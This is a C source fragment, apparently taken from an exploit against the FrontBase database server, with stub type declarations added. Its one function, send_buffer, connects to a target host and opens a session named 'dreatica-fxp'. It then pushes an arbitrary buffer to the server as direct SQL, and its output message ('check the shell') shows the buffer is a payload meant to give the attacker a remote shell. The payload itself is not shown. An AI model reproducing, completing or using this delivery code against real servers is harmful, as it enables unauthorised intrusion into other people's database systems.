
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FBCMetaData ;
typedef int FBCErrorMetaData ;
typedef int FBCDatabaseConnection ;


 int fbcInitialize () ;
 int fbcdcClose (int *) ;
 int * fbcdcConnectToDatabase (char*,char*,char*) ;
 int * fbcdcConnectToDatabaseUsingPort (char*,int,char*) ;
 int * fbcdcCreateSession (int *,char*,char*,char*,char*) ;
 int * fbcdcErrorMetaData (int *,int *) ;
 int * fbcdcExecuteDirectSQL (int *,char*) ;
 int fbcdcRelease (int *) ;
 char* fbcemdAllErrorMessages (int *) ;
 int fbcemdRelease (int *) ;
 scalar_t__ fbcmdErrorsFound (int *) ;
 int fbcmdRelease (int *) ;
 int free (char*) ;
 int printf (char*,...) ;
 int strlen (char*) ;

int send_buffer(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf)
{
 FBCDatabaseConnection * fbdc;
 FBCMetaData *meta;
 char sesn[]="dreatica-fxp";
 if(database!=((void*)0)) port = -1;
 fbcInitialize();
    if (port!=-1)
 {
  printf("[+] Connecting to %s:%d\n", host, port);
  fbdc = fbcdcConnectToDatabaseUsingPort(host, port, dbpassword);
 }else
 {
  printf("[+] Connecting to %s to database %s\n", host, database);
  fbdc = fbcdcConnectToDatabase(database, host, dbpassword);
 }
 if (fbdc == ((void*)0))
 {
  printf("[-] Cannot connect to %s\n", host);
  return -1;
 }
 char * session_name=sesn;
 meta = fbcdcCreateSession(fbdc, session_name, user, password, "system_user");
 if (fbcmdErrorsFound(meta) != 0)
 {
  printf("[-] Failed to create session\n");
  FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
  char* msgs = fbcemdAllErrorMessages(emd);
  fbcemdRelease(emd);
  free(msgs);
  fbcmdRelease(meta);
  fbcdcClose(fbdc);
  fbcdcRelease(fbdc);
  return -1;
 }
 fbcmdRelease(meta);
 printf("[+] Sending %d bytes of buffer to server, check the shell\n", strlen(buf));

 meta = fbcdcExecuteDirectSQL(fbdc, buf);
 if (fbcmdErrorsFound(meta) != 0)
 {
  printf("[-] Failed to send buffer\n");
  FBCErrorMetaData* emd = fbcdcErrorMetaData(fbdc, meta);
  char* msgs = fbcemdAllErrorMessages(emd);
  fbcemdRelease(emd);
  free(msgs);
  fbcmdRelease(meta);
  fbcdcClose(fbdc);
  fbcdcRelease(fbdc);
  return -1;
 }
 fbcmdRelease(meta);
 return 1;
}
